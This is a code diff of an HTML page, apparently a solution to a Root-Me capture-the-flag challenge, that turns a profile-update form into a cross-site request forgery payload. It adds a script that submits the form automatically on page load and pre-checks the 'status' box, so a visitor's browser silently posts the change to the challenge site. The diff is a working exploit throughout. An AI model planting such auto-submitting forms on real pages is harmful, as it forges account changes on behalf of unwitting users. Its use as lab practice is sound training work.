@@ -1,9 +1,18 @@
 <html>
 
-<body>
+<head>
+	<script language="javascript">
+	function autoSubmit() {
+			document.myForm.submit();
+	}
+	</script>
+</head>
+
+
+<body onload="autoSubmit()">
 <br><br><div>
 		<fieldset><legend>Update Profile</legend>
-		<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+		<form name="myForm" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
 		<div class="form-group">
 		<label>Username:</label>
 		<input type="text" name="username" value="user">
@@ -11,7 +20,7 @@
 		<br>		
 		<div class="form-group">
 		<label>Status:</label>
-		<input type="checkbox" name="status" enabled="true" >
+		<input type="checkbox" name="status" enabled="true" checked="true">
 		</div>
 		<br>	
 		<button type="submit">Submit</button>
